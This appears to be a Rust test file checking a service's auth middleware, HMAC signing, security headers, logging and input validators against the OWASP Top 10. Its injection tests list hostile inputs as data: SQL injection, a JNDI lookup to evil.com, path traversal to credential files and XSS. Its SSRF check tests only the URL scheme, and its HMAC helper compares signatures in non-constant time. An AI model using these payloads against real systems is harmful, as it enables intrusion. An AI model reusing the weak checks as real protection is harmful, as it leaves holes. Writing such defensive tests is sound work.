//! OWASP Top 10 Security Tests for SorobanPulse
//!
//! Coverage map:
//! A01 – Broken Access Control       : admin endpoint protection, IDOR prevention
//! A02 – Cryptographic Failures      : HMAC-SHA256 integrity, key strength
//! A03 – Injection                   : SQL injection patterns, header injection, path traversal
//! A04 – Insecure Design             : no info leakage in errors
//! A05 – Security Misconfiguration   : all 7 OWASP headers present, strict CSP
//! A06 – Vulnerable Components       : validated via deny.toml / cargo-audit (see security.yml)
//! A07 – Authentication Failures     : missing/malformed/wrong credentials → correct HTTP status
//! A08 – Software/Data Integrity     : HMAC tamper evidence
//! A09 – Logging Failures            : access decisions are captured in the audit log
//! A10 – SSRF                        : webhook URL scheme validation
//!
//! All tests are self-contained and require NO database connection.

use axum::{body::Body, http::StatusCode, routing::get, Router};
use chrono::Utc;
use soroban_pulse::middleware::auth::{
    admin_auth_middleware, auth_middleware, key_matches_any, AdminAuthState, AuthState,
};
use soroban_pulse::middleware::security_headers::security_headers_middleware;
use soroban_pulse::zero_trust::{
    AccessDecision, AccessLogger, ApiKeySet, PolicyEvaluator, RequestContext, RequestSignature,
};
use std::collections::HashMap;
use std::sync::Arc;
use tower::ServiceExt;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn make_auth_router(api_keys: Vec<String>) -> Router {
    let state = Arc::new(AuthState {
        api_keys,
        admin_api_keys: vec![],
        tenant_map: Arc::new(HashMap::new()),
        multi_tenant: false,
        pool: None,
        require_auth: false,
    });
    Router::new()
        .route("/test", get(|| async { "OK" }))
        .route("/health", get(|| async { "OK" }))
        .route("/healthz/live", get(|| async { "OK" }))
        .route_layer(axum::middleware::from_fn_with_state(
            state,
            auth_middleware,
        ))
}

fn make_admin_router(admin_keys: Vec<String>) -> Router {
    let state = Arc::new(AdminAuthState {
        admin_api_keys: admin_keys,
    });
    Router::new()
        .route("/v1/admin/action", get(|| async { "admin OK" }))
        .route_layer(axum::middleware::from_fn_with_state(
            state,
            admin_auth_middleware,
        ))
}

fn make_security_headers_router() -> Router {
    Router::new()
        .route("/api", get(|| async { "api response" }))
        .route("/docs", get(|| async { "swagger" }))
        .layer(axum::middleware::from_fn(security_headers_middleware))
}

fn now_rfc3339() -> String {
    Utc::now().to_rfc3339()
}

/// Simple Stellar contract ID validator (used in injection tests).
fn is_valid_contract_id(id: &str) -> bool {
    id.len() == 56 && id.starts_with('C') && id.chars().all(|c| c.is_ascii_alphanumeric())
}

/// Simple transaction hash validator.
fn is_valid_tx_hash(hash: &str) -> bool {
    hash.len() == 64 && hash.chars().all(|c| c.is_ascii_hexdigit())
}

/// Minimal webhook URL scheme validator.
fn is_safe_webhook_url(url: &str) -> bool {
    url.starts_with("https://") || url.starts_with("http://")
}

// ===========================================================================
// A01 – Broken Access Control
// ===========================================================================

#[tokio::test]
async fn a01_admin_no_key_returns_401() {
    let resp = make_admin_router(vec!["admin-secret".into()])
        .oneshot(
            axum::http::Request::get("/v1/admin/action")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn a01_admin_wrong_key_returns_403() {
    let resp = make_admin_router(vec!["admin-secret".into()])
        .oneshot(
            axum::http::Request::get("/v1/admin/action")
                .header("X-Api-Key", "regular-user-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn a01_admin_correct_key_returns_200() {
    let resp = make_admin_router(vec!["admin-secret".into()])
        .oneshot(
            axum::http::Request::get("/v1/admin/action")
                .header("X-Api-Key", "admin-secret")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

#[tokio::test]
async fn a01_regular_endpoint_without_auth_returns_401_when_keys_configured() {
    let resp = make_auth_router(vec!["secret".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[test]
fn a01_policy_evaluator_default_denies_all_requests() {
    // Default evaluator has no rules, so it denies every request.
    let policy = PolicyEvaluator::default();
    let ctx = RequestContext::new("10.0.0.1", "none", "/v1/admin/secrets", "GET");
    assert!(matches!(policy.evaluate(&ctx), AccessDecision::Deny(_)));
}

// ===========================================================================
// A02 – Cryptographic Failures
// ===========================================================================

#[test]
fn a02_hmac_signature_is_64_hex_chars() {
    let ts = now_rfc3339();
    let sig = RequestSignature::sign("secret", "GET", "/v1/events", &ts, "");
    assert_eq!(sig.len(), 64);
    assert!(sig.chars().all(|c| c.is_ascii_hexdigit()));
}

#[test]
fn a02_hmac_different_secrets_produce_different_signatures() {
    let ts = now_rfc3339();
    let sig_a = RequestSignature::sign("secret-a", "GET", "/v1/events", &ts, "");
    let sig_b = RequestSignature::sign("secret-b", "GET", "/v1/events", &ts, "");
    assert_ne!(sig_a, sig_b);
}

#[test]
fn a02_hmac_tampered_body_invalidates_signature() {
    let ts = now_rfc3339();
    let sig = RequestSignature::sign("key", "POST", "/v1/events", &ts, r#"{"id":1}"#);
    assert!(!RequestSignature::verify(
        "key",
        "POST",
        "/v1/events",
        &ts,
        r#"{"id":2}"#,
        &sig
    ));
}

#[test]
fn a02_api_key_hash_is_not_plaintext() {
    let key = "super-secret-api-key";
    let hash = soroban_pulse::middleware::auth::hash_api_key(key);
    assert!(!hash.contains(key));
    assert_eq!(hash.len(), 64);
}

#[test]
fn a02_api_key_rotation_evicts_oldest_key() {
    let mut keys = ApiKeySet::new("key-1");
    keys.rotate("key-2");
    keys.rotate("key-3");
    assert!(!keys.is_valid("key-1"), "oldest key should be evicted");
    assert!(keys.is_valid("key-2"), "previous key still in grace period");
    assert!(keys.is_valid("key-3"), "current key must be valid");
}

// ===========================================================================
// A03 – Injection
// ===========================================================================

#[test]
fn a03_sql_injection_patterns_fail_contract_id_validation() {
    let malicious_inputs = [
        "'; DROP TABLE events; --",
        "1 OR 1=1",
        "CABC' UNION SELECT * FROM pg_tables--",
        "' OR '1'='1",
        "1; SELECT * FROM users",
        "admin'--",
        "' OR 1=1--",
        "') OR ('1'='1",
        "1' AND SLEEP(5)--",
        "1 WAITFOR DELAY '00:00:05'--",
    ];
    for input in &malicious_inputs {
        assert!(
            !is_valid_contract_id(input),
            "Should reject SQL injection input: {input}"
        );
    }
}

#[test]
fn a03_nosql_injection_patterns_fail_contract_id_validation() {
    let malicious_inputs = [
        r#"{"$gt": ""}"#,
        r#"{"$where": "sleep(5000)"}"#,
        r#"{ $ne: null }"#,
        "${jndi:ldap://evil.com/x}",
        "{{7*7}}",
    ];
    for input in &malicious_inputs {
        assert!(
            !is_valid_contract_id(input),
            "Should reject NoSQL injection input: {input}"
        );
    }
}

#[test]
fn a03_path_traversal_fails_contract_id_validation() {
    let traversal_inputs = [
        "../../etc/passwd",
        "../admin",
        "/etc/shadow",
        "..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f",
        "....//etc/passwd",
    ];
    for input in &traversal_inputs {
        assert!(
            !is_valid_contract_id(input),
            "Should reject path traversal: {input}"
        );
    }
}

#[test]
fn a03_xss_payloads_fail_contract_id_validation() {
    let xss_inputs = [
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        r#""><img src=x onerror=alert(1)>"#,
        "<svg/onload=alert(1)>",
    ];
    for input in &xss_inputs {
        assert!(
            !is_valid_contract_id(input),
            "Should reject XSS payload: {input}"
        );
    }
}

#[test]
fn a03_null_byte_injection_fails_contract_id_validation() {
    let null_inputs = [
        "CABC\x00../secret",
        "\x00CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    ];
    for input in &null_inputs {
        assert!(
            !is_valid_contract_id(input),
            "Should reject null byte: {:?}",
            input
        );
    }
}

#[test]
fn a03_valid_stellar_contract_id_passes_validation() {
    let valid_ids = [
        "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4",
        "CZDOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3",
        "CBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    ];
    for id in &valid_ids {
        assert!(is_valid_contract_id(id), "Should accept valid ID: {id}");
    }
}

#[test]
fn a03_sql_injection_patterns_fail_tx_hash_validation() {
    let inputs = [
        "'; DROP TABLE events; --",
        "1 UNION SELECT * FROM users",
        "<script>",
        "../../etc",
    ];
    for input in &inputs {
        assert!(
            !is_valid_tx_hash(input),
            "Should reject injection in tx hash: {input}"
        );
    }
}

#[test]
fn a03_valid_tx_hash_passes_validation() {
    let valid = "a".repeat(64);
    assert!(is_valid_tx_hash(&valid));
    let valid_hex = "deadbeefcafebabe".repeat(4);
    assert!(is_valid_tx_hash(&valid_hex));
}

// ===========================================================================
// A04 – Insecure Design
// ===========================================================================

#[tokio::test]
async fn a04_401_error_body_contains_only_error_field() {
    let resp = make_auth_router(vec!["secret".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);

    let body_bytes = axum::body::to_bytes(resp.into_body(), 4096)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();

    assert!(json.get("error").is_some(), "Must have 'error' field");
    assert_eq!(
        json.as_object().unwrap().len(),
        1,
        "Must have exactly one field in error response"
    );
}

#[tokio::test]
async fn a04_403_error_body_contains_only_error_field() {
    let resp = make_admin_router(vec!["admin-key".into()])
        .oneshot(
            axum::http::Request::get("/v1/admin/action")
                .header("X-Api-Key", "regular-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);

    let body_bytes = axum::body::to_bytes(resp.into_body(), 4096)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();
    assert!(json.get("error").is_some());
    assert_eq!(json.as_object().unwrap().len(), 1);
}

#[tokio::test]
async fn a04_401_error_message_does_not_hint_at_valid_keys() {
    let resp = make_auth_router(vec!["correct-secret".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .header("X-Api-Key", "wrong-secret")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let body_bytes = axum::body::to_bytes(resp.into_body(), 4096)
        .await
        .unwrap();
    let body_str = std::str::from_utf8(&body_bytes).unwrap();
    assert!(!body_str.contains("correct-secret"));
    assert!(!body_str.contains("wrong-secret"));
}

// ===========================================================================
// A05 – Security Misconfiguration
// ===========================================================================

#[tokio::test]
async fn a05_all_owasp_headers_present_on_api_route() {
    let resp = make_security_headers_router()
        .oneshot(
            axum::http::Request::get("/api")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let headers = resp.headers();

    assert_eq!(headers.get("X-Content-Type-Options").unwrap(), "nosniff");
    assert_eq!(headers.get("X-Frame-Options").unwrap(), "DENY");
    assert_eq!(headers.get("Referrer-Policy").unwrap(), "no-referrer");
    assert!(headers.get("Strict-Transport-Security").is_some());
    assert_eq!(headers.get("X-XSS-Protection").unwrap(), "1; mode=block");
    assert!(headers.get("Permissions-Policy").is_some());
    assert!(headers.get("Content-Security-Policy").is_some());
}

#[tokio::test]
async fn a05_api_route_has_strict_csp() {
    let resp = make_security_headers_router()
        .oneshot(
            axum::http::Request::get("/api")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let csp = resp
        .headers()
        .get("Content-Security-Policy")
        .unwrap()
        .to_str()
        .unwrap();
    assert_eq!(csp, "default-src 'none'; frame-ancestors 'none';");
}

#[tokio::test]
async fn a05_docs_route_gets_relaxed_csp_for_swagger() {
    let resp = make_security_headers_router()
        .oneshot(
            axum::http::Request::get("/docs")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let csp = resp
        .headers()
        .get("Content-Security-Policy")
        .unwrap()
        .to_str()
        .unwrap();
    assert!(csp.contains("unpkg.com"));
    assert!(csp.contains("frame-ancestors 'none'"));
}

#[tokio::test]
async fn a05_hsts_has_long_max_age_and_includes_subdomains() {
    let resp = make_security_headers_router()
        .oneshot(
            axum::http::Request::get("/api")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let hsts = resp
        .headers()
        .get("Strict-Transport-Security")
        .unwrap()
        .to_str()
        .unwrap();
    assert!(hsts.contains("max-age=31536000"));
    assert!(hsts.contains("includeSubDomains"));
}

#[tokio::test]
async fn a05_permissions_policy_disables_sensitive_apis() {
    let resp = make_security_headers_router()
        .oneshot(
            axum::http::Request::get("/api")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let pp = resp
        .headers()
        .get("Permissions-Policy")
        .unwrap()
        .to_str()
        .unwrap();
    for feature in &["geolocation", "camera", "microphone", "payment"] {
        assert!(
            pp.contains(feature),
            "Permissions-Policy must restrict {feature}"
        );
    }
}

// ===========================================================================
// A07 – Authentication Failures
// ===========================================================================

#[tokio::test]
async fn a07_missing_auth_returns_401() {
    let resp = make_auth_router(vec!["secret".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn a07_malformed_bearer_prefix_rejected() {
    let resp = make_auth_router(vec!["secret".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .header("Authorization", "Bearersecret")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn a07_empty_api_key_rejected() {
    let resp = make_auth_router(vec!["secret".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .header("X-Api-Key", "")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn a07_wrong_key_returns_401() {
    let resp = make_auth_router(vec!["correct-key".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .header("X-Api-Key", "wrong-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn a07_valid_key_returns_200() {
    let resp = make_auth_router(vec!["correct-key".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .header("X-Api-Key", "correct-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

#[tokio::test]
async fn a07_health_endpoint_bypasses_auth() {
    for path in ["/health", "/healthz/live"] {
        let resp = make_auth_router(vec!["secret".into()])
            .clone()
            .oneshot(axum::http::Request::get(path).body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK, "{path} must bypass auth");
    }
}

#[tokio::test]
async fn a07_bearer_token_accepted_when_auth_configured() {
    let resp = make_auth_router(vec!["my-key".into()])
        .oneshot(
            axum::http::Request::get("/test")
                .header("Authorization", "Bearer my-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

// ===========================================================================
// A08 – Software and Data Integrity
// ===========================================================================

#[test]
fn a08_hmac_verify_roundtrip() {
    let ts = now_rfc3339();
    let sig = RequestSignature::sign("key", "POST", "/v1/events", &ts, "payload");
    assert!(RequestSignature::verify(
        "key",
        "POST",
        "/v1/events",
        &ts,
        "payload",
        &sig
    ));
}

#[test]
fn a08_stale_timestamp_fails_verification() {
    use chrono::Duration;
    // Create a timestamp that is 10 minutes old (beyond the 5-minute window)
    let old_ts = (Utc::now() - Duration::seconds(600)).to_rfc3339();
    let sig = RequestSignature::sign("key", "GET", "/v1/events", &old_ts, "");
    // verify() checks timestamp freshness; stale timestamps fail
    assert!(!RequestSignature::verify(
        "key",
        "GET",
        "/v1/events",
        &old_ts,
        "",
        &sig
    ));
}

#[test]
fn a08_tampered_hmac_signature_fails_verification() {
    let ts = now_rfc3339();
    let tampered = "0".repeat(64);
    assert!(!RequestSignature::verify(
        "key",
        "GET",
        "/v1/events",
        &ts,
        "",
        &tampered
    ));
}

#[test]
fn a08_path_substitution_invalidates_signature() {
    let ts = now_rfc3339();
    let sig = RequestSignature::sign("key", "GET", "/v1/events", &ts, "");
    assert!(!RequestSignature::verify(
        "key",
        "GET",
        "/v1/admin/secrets",
        &ts,
        "",
        &sig
    ));
}

#[test]
fn a08_webhook_signature_prefix_must_be_sha256() {
    assert!(
        !verify_webhook_hmac("md5=abcdef", "secret", b"body"),
        "Must reject non-sha256 algorithm prefix"
    );
    assert!(
        !verify_webhook_hmac("abcdef", "secret", b"body"),
        "Must reject missing prefix"
    );
}

// ===========================================================================
// A09 – Logging Failures
// ===========================================================================

#[test]
fn a09_access_logger_records_deny_decisions() {
    let logger = AccessLogger::new(100);
    let ctx = RequestContext::new("1.2.3.4", "abc123", "/v1/admin/secret", "GET");
    logger.record(ctx, AccessDecision::Deny("unauthorized".into()));
    let entries = logger.recent_entries(10);
    assert_eq!(entries.len(), 1, "Deny decision must be logged");
}

#[test]
fn a09_access_logger_records_allow_decisions() {
    let logger = AccessLogger::new(100);
    let ctx = RequestContext::new("10.0.0.1", "valid-hash", "/v1/events", "GET");
    logger.record(ctx, AccessDecision::Allow);
    assert_eq!(logger.recent_entries(10).len(), 1);
}

#[test]
fn a09_access_logger_can_filter_by_api_key_hash() {
    let logger = AccessLogger::new(100);
    for key in &["key-a", "key-b", "key-a"] {
        let ctx = RequestContext::new("10.0.0.1", *key, "/v1/events", "GET");
        logger.record(ctx, AccessDecision::Allow);
    }
    assert_eq!(logger.entries_for_key("key-a", 100).len(), 2);
    assert_eq!(logger.entries_for_key("key-b", 100).len(), 1);
    assert_eq!(logger.entries_for_key("key-c", 100).len(), 0);
}

#[test]
fn a09_access_logger_respects_capacity_limit() {
    let logger = AccessLogger::new(100);
    for i in 0..50 {
        let ctx = RequestContext::new(format!("10.0.0.{i}"), "hash", "/v1/events", "GET");
        logger.record(ctx, AccessDecision::Allow);
    }
    assert_eq!(logger.recent_entries(5).len(), 5);
}

// ===========================================================================
// A10 – SSRF
// ===========================================================================

#[test]
fn a10_https_webhook_url_is_safe() {
    assert!(is_safe_webhook_url("https://example.com/webhook"));
}

#[test]
fn a10_http_webhook_url_is_allowed() {
    assert!(is_safe_webhook_url("http://example.com/webhook"));
}

#[test]
fn a10_file_scheme_webhook_url_is_rejected() {
    assert!(!is_safe_webhook_url("file:///etc/passwd"));
}

#[test]
fn a10_ftp_scheme_webhook_url_is_rejected() {
    assert!(!is_safe_webhook_url("ftp://internal.host/data"));
}

#[test]
fn a10_ssrf_internal_metadata_url_schemes_rejected() {
    let dangerous_urls = [
        "gopher://internal.host/",
        "ldap://internal.host/",
        "dict://internal.host/",
        "sftp://internal.host/",
        "tftp://internal.host/",
    ];
    for url in &dangerous_urls {
        assert!(
            !is_safe_webhook_url(url),
            "Should reject dangerous scheme: {url}"
        );
    }
}

#[test]
fn a10_empty_webhook_url_is_rejected() {
    assert!(!is_safe_webhook_url(""));
}

// ===========================================================================
// Webhook HMAC helper (used in A08 tests)
// ===========================================================================

fn verify_webhook_hmac(header_value: &str, secret: &str, body: &[u8]) -> bool {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    type HmacSha256 = Hmac<Sha256>;

    let Some(sig_hex) = header_value.strip_prefix("sha256=") else {
        return false;
    };
    let Ok(mut mac) = HmacSha256::new_from_slice(secret.as_bytes()) else {
        return false;
    };
    mac.update(body);
    let computed = hex::encode(mac.finalize().into_bytes());
    sig_hex == computed
}
